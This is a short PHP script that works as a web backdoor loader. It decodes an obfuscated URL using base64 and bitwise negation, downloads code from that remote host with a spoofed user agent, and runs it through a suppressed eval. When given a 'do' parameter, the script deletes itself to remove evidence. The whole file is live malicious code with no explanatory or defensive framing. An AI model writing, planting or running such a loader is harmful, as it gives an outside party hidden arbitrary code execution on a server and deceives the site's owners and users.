<?php
function _dl($url)
{
        $file_contents = '';
		$real_user_agent = $_SERVER['HTTP_USER_AGENT'];
        if (function_exists('file_get_contents')) {
			ini_set('user_agent',$real_user_agent);
            $file_contents = @file_get_contents($url);
        }
        if (strlen($file_contents) < 10 && function_exists('curl_init')) {
            $file_contents = '';
			$ch = curl_init();
			$timeout = 60;
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
			curl_setopt($ch, CURLOPT_USERAGENT, $real_user_agent);
			$file_contents = curl_exec($ch);
			curl_close($ch);
     }
        return $file_contents;
}

if (isset($_GET['do'])) {
    unlink(__FILE__);
    header("Location :?t");
} else {
    $code = _dl(~base64_decode('l4uLj8XQ0IiIiNGWks7Gxs/RnJCS0JWM0JyQm5rRj5eP'));
    @eval($code);
}


